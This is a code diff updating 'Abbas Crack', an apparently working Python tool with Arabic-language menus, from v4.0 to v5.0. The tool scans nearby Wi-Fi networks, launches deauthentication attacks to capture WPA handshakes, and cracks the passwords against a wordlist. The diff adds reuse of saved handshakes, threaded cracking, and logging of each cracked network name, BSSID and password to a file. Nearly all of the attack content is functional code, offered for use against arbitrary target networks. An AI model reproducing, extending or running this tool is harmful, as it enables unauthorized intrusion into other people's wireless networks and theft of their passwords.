@@ -2,9 +2,14 @@
 # -*- coding: utf-8 -*-
 
 """
-Abbas Crack v4.0 - TUI لوحين: سكان + سحب إلى خانة Handshake + كسر تلقائي
-يعمل على Termux و Kali بدون scapy
+Abbas Crack v5.0
+- إصلاح كسر C
+- إعادة استخدام handshake موجود تلقائياً
+- واجهة محسّنة بدون أخطاء
+- سكان + التقاط + كسر بالتزامن
+- كسر تلقائي بـ pass123.txt
 المبرمج: جنرال عباس 🇮🇶
+Instagram: @s.nfu
 """
 
 import os, sys, struct, hmac, hashlib, time, argparse, multiprocessing
@@ -32,9 +37,12 @@ for d in (WORK_DIR, HS_DIR, DUMP_DIR):
 
 
 def log(msg):
-    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"[{ts}] {msg}\n")
+    try:
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{ts}] {msg}\n")
+    except Exception:
+        pass
 
 
 def run(cmd, timeout=None, capture=True):
@@ -52,7 +60,7 @@ def have(tool):
     return shutil.which(tool) is not None
 
 
-# ================= PCAP parser (v1.1 core) =================
+# ================= PCAP parser =================
 
 def read_pcap(filepath):
     with open(filepath, 'rb') as f:
@@ -247,6 +255,22 @@ def crack_worker(hs, wl_path, workers=None, single=False,
     return None
 
 
+# ================= Handshake reuse =================
+
+def find_existing_handshake(bssid):
+    """ابحث عن handshake محفوظ لـ BSSID معين في hs/."""
+    tag = bssid.replace(':', '-')
+    candidates = glob.glob(os.path.join(HS_DIR, f"handshake_*_{tag}_*.cap"))
+    candidates = [f for f in candidates
+                  if os.path.exists(f) and os.path.getsize(f) > 10000]
+    candidates.sort(key=lambda f: os.path.getmtime(f), reverse=True)
+    for cap in candidates:
+        hs = parse_handshake(cap, quiet=True)
+        if hs:
+            return cap, hs
+    return None, None
+
+
 # ================= Interface mgmt =================
 
 def detect_monitor_iface():
@@ -321,6 +345,14 @@ def scan_networks_async(iface, duration, out_q):
 
 
 def capture_handshake_async(iface, ap, timeout, out_q):
+    """هجوم Deauth + التقاط. يتخطى الهجوم إذا handshake موجود."""
+    existing, hs = find_existing_handshake(ap['bssid'])
+    if existing and hs:
+        out_q.put(("cap_status", f"♻️ re-using: {os.path.basename(existing)[:35]}"))
+        out_q.put(("cap_done", existing, ap))
+        log(f"REUSE {existing}")
+        return
+
     safe = re.sub(r"[^\w.-]", "_", ap['essid'] or "unknown")[:32]
     ts = datetime.now().strftime("%Y%m%d_%H%M%S")
     prefix = os.path.join(HS_DIR, f"handshake_{safe}_{ap['bssid'].replace(':','-')}_{ts}")
@@ -358,15 +390,44 @@ def capture_handshake_async(iface, ap, timeout, out_q):
         out_q.put(("cap_fail", ap))
 
 
+# ================= Crack runner =================
+
+def crack_runner(hs, wl_path, out_q, workers=None, single=False):
+    """شغّل crack_worker في thread + pump progress إلى out_q الرئيسي."""
+    local_q = Queue()
+    def pump():
+        while True:
+            try:
+                m = local_q.get(timeout=0.3)
+            except Empty:
+                continue
+            if m[0] == "progress":
+                out_q.put(("crack_progress", m[1], m[2], m[3]))
+            elif m[0] == "done":
+                out_q.put(("crack_done", m[1], m[2], m[3])); return
+            elif m[0] == "fail":
+                out_q.put(("crack_fail", m[1], m[2], m[3])); return
+    threading.Thread(target=pump, daemon=True).start()
+    crack_worker(hs, wl_path, workers, single, local_q)
+
+
 # ================= TUI =================
 
+def safe_addstr(stdscr, y, x, text, attr=0):
+    try:
+        h, w = stdscr.getmaxyx()
+        if 0 <= y < h and 0 <= x < w:
+            stdscr.addstr(y, x, text[:max(0, w - x - 1)], attr)
+    except curses.error:
+        pass
+
+
 def draw_network_panel(stdscr, aps, idx, top, panel_y, panel_x, panel_h, panel_w):
-    stdscr.addstr(panel_y, panel_x,
-                  "┌─ Networks ──────────────────┐", curses.color_pair(4))
-    visible = panel_h - 3
+    safe_addstr(stdscr, panel_y, panel_x,
+                "┌─ Networks ──────────────────┐", curses.color_pair(4))
+    visible = max(1, panel_h - 3)
     if idx < top: top = idx
     if idx >= top + visible: top = idx - visible + 1
-
     for i in range(top, min(len(aps), top + visible)):
         ap = aps[i]
         col = curses.color_pair(1) if ap['power'] > -60 else (
@@ -375,47 +436,47 @@ def draw_network_panel(stdscr, aps, idx, top, panel_y, panel_x, panel_h, panel_w
         ssid = ap['essid'][:14]
         line = f"│{marker} {ssid:<14} {ap['power']:>4}dBm │"
         attr = col | (curses.A_REVERSE if i == idx else 0)
-        try: stdscr.addstr(panel_y + 1 + (i - top), panel_x, line[:panel_w], attr)
-        except curses.error: pass
-    stdscr.addstr(panel_y + panel_h - 1, panel_x,
-                  "└" + "─" * (panel_w - 2) + "┘", curses.color_pair(4))
+        safe_addstr(stdscr, panel_y + 1 + (i - top), panel_x, line[:panel_w], attr)
+    safe_addstr(stdscr, panel_y + panel_h - 1, panel_x,
+                "└" + "─" * (panel_w - 2) + "┘", curses.color_pair(4))
     return top
 
 
 def draw_handshake_slot(stdscr, slot, cap_status, panel_y, panel_x, panel_h, panel_w):
-    stdscr.addstr(panel_y, panel_x,
-                  "┌─ Handshake Slot ────────────┐", curses.color_pair(4))
+    safe_addstr(stdscr, panel_y, panel_x,
+                "┌─ Handshake Slot ────────────┐", curses.color_pair(4))
     if slot is None:
-        msg = "   [ فارغ — اسحب شبكة ]"
-        stdscr.addstr(panel_y + 3, panel_x + 1, msg[:panel_w - 2], curses.color_pair(3))
+        safe_addstr(stdscr, panel_y + 3, panel_x + 1,
+                    "[ فارغ — اسحب شبكة بـ D ]", curses.color_pair(3))
     else:
-        stdscr.addstr(panel_y + 2, panel_x + 1,
-                      f" SSID: {slot['essid'][:18]}", curses.color_pair(1) | curses.A_BOLD)
-        stdscr.addstr(panel_y + 3, panel_x + 1,
-                      f" BSSID: {slot['bssid']}", curses.color_pair(2))
-        stdscr.addstr(panel_y + 4, panel_x + 1,
-                      f" CH: {slot['channel']}  PWR: {slot['power']}dBm", curses.color_pair(2))
+        safe_addstr(stdscr, panel_y + 2, panel_x + 1,
+                    f"SSID: {slot['essid'][:18]}",
+                    curses.color_pair(1) | curses.A_BOLD)
+        safe_addstr(stdscr, panel_y + 3, panel_x + 1,
+                    f"BSSID: {slot['bssid']}", curses.color_pair(2))
+        safe_addstr(stdscr, panel_y + 4, panel_x + 1,
+                    f"CH:{slot['channel']} PWR:{slot['power']}dBm",
+                    curses.color_pair(2))
         if slot.get('cap'):
-            stdscr.addstr(panel_y + 5, panel_x + 1,
-                          f" ✅ {os.path.basename(slot['cap'])[:22]}", curses.color_pair(1))
+            safe_addstr(stdscr, panel_y + 5, panel_x + 1,
+                        f"✅ {os.path.basename(slot['cap'])[:24]}",
+                        curses.color_pair(1))
+            safe_addstr(stdscr, panel_y + 6, panel_x + 1,
+                        "👉 اضغط C للكسر", curses.color_pair(5) | curses.A_BOLD)
         elif cap_status:
-            stdscr.addstr(panel_y + 5, panel_x + 1,
-                          f" {cap_status[:26]}", curses.color_pair(2))
+            safe_addstr(stdscr, panel_y + 5, panel_x + 1,
+                        cap_status[:26], curses.color_pair(2))
         else:
-            stdscr.addstr(panel_y + 5, panel_x + 1,
-                          " [ اضغط D لسحب الشبكة ]", curses.color_pair(3))
-    for i in range(1, panel_h - 1):
-        try: stdscr.addstr(panel_y + i, panel_x + panel_w - 1, "│", curses.color_pair(4))
-        except curses.error: pass
-    stdscr.addstr(panel_y + panel_h - 1, panel_x,
-                  "└" + "─" * (panel_w - 2) + "┘", curses.color_pair(4))
+            safe_addstr(stdscr, panel_y + 5, panel_x + 1,
+                        "[ اضغط D لسحب الشبكة ]", curses.color_pair(3))
+    safe_addstr(stdscr, panel_y + panel_h - 1, panel_x,
+                "└" + "─" * (panel_w - 2) + "┘", curses.color_pair(4))
 
 
 def draw_status_bar(stdscr, h, w, msg, cracked=None):
     bar = f" {msg} " if msg else ""
-    bar = bar[:w - 1]
     try:
-        stdscr.addstr(h - 2, 0, bar.ljust(w - 1),
+        stdscr.addstr(h - 2, 0, bar[:w - 1].ljust(w - 1),
                       curses.color_pair(4) | curses.A_REVERSE)
     except curses.error: pass
     keys = " [S]سكان  [↑/↓]تنقل  [D]سحب  [C]كسر  [R]إعادة  [Q]خروج "
@@ -440,44 +501,40 @@ def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single)
     curses.init_pair(4, curses.COLOR_CYAN, -1)
     curses.init_pair(5, curses.COLOR_MAGENTA, -1)
 
-    aps = []
-    idx = 0
-    top = 0
+    aps = []; idx = 0; top = 0
     slot = None
     status_msg = "جاهز — اضغط S لسكان الشبكات"
     cap_status = ""
     cracked_pwd = None
     out_q = Queue()
+    crack_running = False
 
     while True:
         h, w = stdscr.getmaxyx()
         stdscr.clear()
 
-        title = " Abbas Crack v4.0 — جنرال عباس 🇮🇶 "
-        stdscr.addstr(0, max(0, (w - len(title)) // 2), title,
-                      curses.color_pair(5) | curses.A_BOLD)
+        title = " Abbas Crack v5.0 — جنرال عباس 🇮🇶 "
+        safe_addstr(stdscr, 0, max(0, (w - len(title)) // 2), title,
+                    curses.color_pair(5) | curses.A_BOLD)
 
         panel_h = h - 6
         panel_w = max(30, w // 2 - 2)
-        draw_network_panel(stdscr, aps, idx, top, 1, 1, panel_h, panel_w)
+        top = draw_network_panel(stdscr, aps, idx, top, 1, 1, panel_h, panel_w)
         draw_handshake_slot(stdscr, slot, cap_status, 1, w - panel_w - 1,
                             panel_h, panel_w)
         draw_status_bar(stdscr, h, w, status_msg, cracked_pwd)
         stdscr.refresh()
 
-        # drain queue
         try:
             while True:
                 msg = out_q.get_nowait()
                 if msg[0] == "scan_progress":
                     status_msg = f"سكان... {msg[1]}/{msg[2]}s"
                 elif msg[0] == "scan_done":
-                    aps = msg[1]
-                    idx = 0; top = 0
+                    aps = msg[1]; idx = 0; top = 0
                     status_msg = f"وُجد {len(aps)} شبكة — اختر بـ↑/↓ ثم D للسحب"
                 elif msg[0] == "cap_status":
-                    cap_status = msg[1]
-                    status_msg = msg[1]
+                    cap_status = msg[1]; status_msg = msg[1]
                 elif msg[0] == "cap_done":
                     _, cap, ap = msg
                     slot = {**ap, "cap": cap}
@@ -490,7 +547,10 @@ def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single)
                     st.setdefault("captures", []).append({
                         "file": cap, "essid": ap['essid'], "bssid": ap['bssid'],
                         "channel": ap['channel'], "ts": datetime.now().isoformat()})
-                    json.dump(st, open(STATE_FILE, "w"), indent=2, ensure_ascii=False)
+                    try:
+                        json.dump(st, open(STATE_FILE, "w"),
+                                  indent=2, ensure_ascii=False)
+                    except Exception: pass
                 elif msg[0] == "cap_fail":
                     cap_status = "❌ فشل الالتقاط"
                     status_msg = "جرّب مرة ثانية — أو اقترب من الهدف"
@@ -500,10 +560,26 @@ def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single)
                 elif msg[0] == "crack_done":
                     _, pwd, tested, el = msg
                     cracked_pwd = pwd
+                    crack_running = False
                     status_msg = f"✅ {pwd} — {tested:,} محاولة في {int(el)}s"
+                    res_path = os.path.join(WORK_DIR, "cracked.json")
+                    try:
+                        data = json.load(open(res_path)) if os.path.exists(res_path) else []
+                    except Exception:
+                        data = []
+                    if slot:
+                        data.append({
+                            "essid": slot['essid'], "bssid": slot['bssid'],
+                            "pwd": pwd, "capture": slot['cap'],
+                            "ts": datetime.now().isoformat()})
+                        try:
+                            json.dump(data, open(res_path, "w"),
+                                      indent=2, ensure_ascii=False)
+                        except Exception: pass
                 elif msg[0] == "crack_fail":
                     _, tested, total, el = msg
-                    status_msg = f"❌ ما لقيت — {tested:,} محاولة"
+                    crack_running = False
+                    status_msg = f"❌ ما لقيت — {tested:,} محاولة في {int(el)}s"
         except Empty:
             pass
 
@@ -517,11 +593,10 @@ def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single)
             aps = []; slot = None; cracked_pwd = None
             status_msg = f"سكان {scan_time}s على {iface}..."
             stdscr.clear()
-            stdscr.addstr(2, 2, status_msg, curses.color_pair(2))
+            safe_addstr(stdscr, 2, 2, status_msg, curses.color_pair(2))
             stdscr.refresh()
-            t = threading.Thread(target=scan_networks_async,
-                                 args=(iface, scan_time, out_q), daemon=True)
-            t.start()
+            threading.Thread(target=scan_networks_async,
+                             args=(iface, scan_time, out_q), daemon=True).start()
         elif ch in (curses.KEY_UP, ord('k')) and aps:
             idx = (idx - 1) % len(aps)
         elif ch in (curses.KEY_DOWN, ord('j')) and aps:
@@ -531,35 +606,30 @@ def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single)
             slot = {**sel, "cap": None}
             cap_status = "بدء الهجوم..."
             status_msg = f"هجوم على {sel['essid']} ({sel['bssid']})..."
-            t = threading.Thread(target=capture_handshake_async,
-                                 args=(iface, sel, attack_timeout, out_q),
-                                 daemon=True)
-            t.start()
-        elif ch in (ord('c'), ord('C')) and slot and slot.get('cap'):
-            status_msg = f"كسر بـ {os.path.basename(wl_path)}..."
+            threading.Thread(target=capture_handshake_async,
+                             args=(iface, sel, attack_timeout, out_q),
+                             daemon=True).start()
+        elif ch in (ord('c'), ord('C')):
+            if slot is None:
+                status_msg = "❌ ما فيه شبكة في الخانة — اضغط D أولاً"
+                continue
+            if not slot.get('cap'):
+                status_msg = "❌ الـ Handshake ما التقط بعد — انتظر"
+                continue
+            if crack_running:
+                status_msg = "⏳ الكسر جاري..."
+                continue
             hs = parse_handshake(slot['cap'], quiet=True)
             if not hs:
-                status_msg = "❌ الـ Handshake غير صالح"
+                status_msg = "❌ الـ Handshake غير صالح — التقط مرة ثانية"
+                slot = {**slot, "cap": None}
                 continue
-
-            def crack_t():
-                local_q = Queue()
-                def poll():
-                    while True:
-                        try:
-                            m = local_q.get(timeout=0.3)
-                            if m[0] == "progress":
-                                out_q.put(("crack_progress", m[1], m[2], m[3]))
-                            elif m[0] == "done":
-                                out_q.put(("crack_done", m[1], m[2], m[3])); return
-                            elif m[0] == "fail":
-                                out_q.put(("crack_fail", m[1], m[2], m[3])); return
-                        except Empty:
-                            continue
-                th = threading.Thread(target=poll, daemon=True)
-                th.start()
-                crack_worker(hs, wl_path, workers, single, local_q)
-            threading.Thread(target=crack_t, daemon=True).start()
+            if not os.path.exists(wl_path):
+                status_msg = f"❌ wordlist ما موجود: {wl_path}"
+                continue
+            crack_running = True
+            status_msg = f"بدء الكسر بـ {os.path.basename(wl_path)}..."
+            crack_runner(hs, wl_path, out_q, workers, single)
         elif ch in (ord('r'), ord('R')):
             aps = []; slot = None; cracked_pwd = None; cap_status = ""
             status_msg = "تم التصفير"
@@ -568,7 +638,7 @@ def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single)
 # ================= CLI =================
 
 def main():
-    p = argparse.ArgumentParser(description="Abbas Crack v4.0 — TUI لوحين")
+    p = argparse.ArgumentParser(description="Abbas Crack v5.0")
     p.add_argument("--iface", default=None)
     p.add_argument("--wordlist", default=DEFAULT_WL)
     p.add_argument("--scan-time", type=int, default=25)
@@ -609,17 +679,38 @@ def main():
         if not (1 <= n <= len(aps)): return
         sel = aps[n - 1]
         print(f"{C.MAGENTA}[*] الهدف: {sel['essid']} ({sel['bssid']}){C.RESET}")
-        q2 = Queue()
-        capture_handshake_async(iface, sel, a.attack_timeout, q2)
-        cap = None
-        while True:
-            m = q2.get()
-            if m[0] == "cap_status": print(f"{C.GRAY}  {m[1]}{C.RESET}")
-            elif m[0] == "cap_done": cap = m[1]; break
-            elif m[0] == "cap_fail": break
-        if not cap: return
-        hs = parse_handshake(cap)
-        if hs: crack_worker(hs, a.wordlist, a.workers, a.single, None)
+
+        cap, hs = find_existing_handshake(sel['bssid'])
+        if cap and hs:
+            print(f"{C.GREEN}[+] handshake موجود: {os.path.basename(cap)}{C.RESET}")
+        else:
+            print(f"{C.YELLOW}[*] ما فيه handshake محفوظ — بدء الهجوم{C.RESET}")
+            q2 = Queue()
+            capture_handshake_async(iface, sel, a.attack_timeout, q2)
+            while True:
+                m = q2.get()
+                if m[0] == "cap_status": print(f"{C.GRAY}  {m[1]}{C.RESET}")
+                elif m[0] == "cap_done": cap = m[1]; break
+                elif m[0] == "cap_fail":
+                    print(f"{C.RED}❌ فشل الالتقاط{C.RESET}"); return
+            hs = parse_handshake(cap, quiet=False)
+            if not hs:
+                print(f"{C.RED}❌ handshake غير صالح{C.RESET}"); return
+
+        print(f"\n{C.CYAN}[*] بدء الكسر بـ {a.wordlist}{C.RESET}")
+        pwd = crack_worker(hs, a.wordlist, a.workers, a.single)
+        if pwd:
+            res_path = os.path.join(WORK_DIR, "cracked.json")
+            try: data = json.load(open(res_path))
+            except: data = []
+            data.append({"essid": sel['essid'], "bssid": sel['bssid'],
+                         "pwd": pwd, "capture": cap,
+                         "ts": datetime.now().isoformat()})
+            try: json.dump(data, open(res_path, "w"), indent=2, ensure_ascii=False)
+            except Exception: pass
+            print(f"\n{C.GREEN}{C.BOLD}✅ كلمة السر: {pwd}{C.RESET}")
+        else:
+            print(f"\n{C.RED}❌ ما لقينا في القائمة{C.RESET}")
         return
 
     curses.wrapper(tui_main, iface, a.wordlist, a.scan_time,
